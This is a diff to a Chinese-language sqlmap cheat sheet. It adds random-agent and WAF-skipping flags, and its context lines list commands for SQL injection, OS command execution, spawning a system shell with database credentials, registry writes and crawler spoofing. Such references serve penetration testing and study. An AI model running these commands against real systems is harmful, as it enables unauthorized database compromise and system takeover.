@@ -25,7 +25,7 @@
 
 **检测注入**
 ```bash
-sqlmap -u URL                                           # 判断注入
+sqlmap -u URL -v 3 --random-agent                       # 判断注入
 sqlmap -u URL -p id                                     # 指定参数注入
 sqlmap -u URL --cookie="xxxxx"                          # 带 cookie 注入
 sqlmap -u URL --batch                                   # 不要请求用户输入,使用默认行为
@@ -85,7 +85,7 @@ sqlmap -u URL --os-cmd=ipconfig                 # 在注入点直接执行命令
 sqlmap -d "mssql://sa:sql123456@ip:1433/master" --os-shell  # 知道数据库密码后提权成为交互式系统shell
 ```
 
-**对Windows注册表操作**
+**对 Windows 注册表操作**
 ```bash
 --reg-read                                      # 读取注册表值
 --reg-add                                       # 写入注册表值
@@ -106,6 +106,7 @@ sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-val
 --mobile                                                            # 模仿智能手机
 --referer "http://www.google.com"                                   # 模拟来源
 --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"    # 模拟谷歌蜘蛛
+--skip-waf
 ```
 
 **尝试 getshell**
